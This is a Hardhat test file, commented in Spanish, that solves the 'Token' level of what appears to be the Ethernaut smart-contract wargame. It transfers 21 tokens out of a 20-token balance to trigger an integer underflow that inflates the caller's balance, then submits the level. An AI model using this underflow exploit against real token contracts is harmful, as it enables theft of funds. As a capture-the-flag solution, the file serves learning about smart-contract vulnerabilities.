import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoa2: Signer;
let attacker: Contract;
let challenge: Contract;
let tx: any;
const LEVEL_ADDRESS = "0x63bE8347A617476CA461649897238A31835a32CE";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  [, eoa2] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`Token`);
  // const challengeAddress = await createChallenge(
  //   levelAddress
  // );

  //Para este challenge existen 2 formas de testear. La primera creando varias accounts (3 específicamente - Owner + Account1 + Account2) y realizar el transfer entre ellas. Mientras que la segunda consiste en crear la instancia a partir de la interfaz web, y utilizar las accounts de siempre (2 específicamente - Account1 + Account2). Acá voy a utilizar la última.
  challenge = await challengeFactory.attach(`0x90209D122aa12c3E5c9cB166a845bD355eba3c3b`);
});

describe("Token Challenge", async () => {
  it("Resuelve el challenge - Token", async ()=> {
    let nuestraAddress = await eoa.getAddress();
    let addressCualquiera = await eoa2.getAddress();

    let balanceInicial = await challenge.balanceOf(nuestraAddress);
    console.log(`EL BALANCE INICIAL ES DE: ${balanceInicial}`);
    expect(balanceInicial).to.be.equal(20);
    
    //Realizamos una transferencia desde nuestra cuenta a cualquier otra address
    let txTransfer = await challenge.transfer(addressCualquiera,21);
    await txTransfer.wait();

    //Verificamos que nuestro balance sea mayor a 0 (debería dar el valor por overflow).
    let nuestroBalance = await challenge.balanceOf(nuestraAddress);
    console.log(`AHORA TU BALANCE ES DE: ${nuestroBalance}`);
    
    expect(nuestroBalance > 0, "EL BALANCE CONTINÚA SIENDO CERO");
  })
})

after(async ()=> {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
})

//Anécdota: No había leído que se iniciaba con 20 tokens. Descubrí que se iniciaba con esta cantidad al analizar las transacciones en etherscan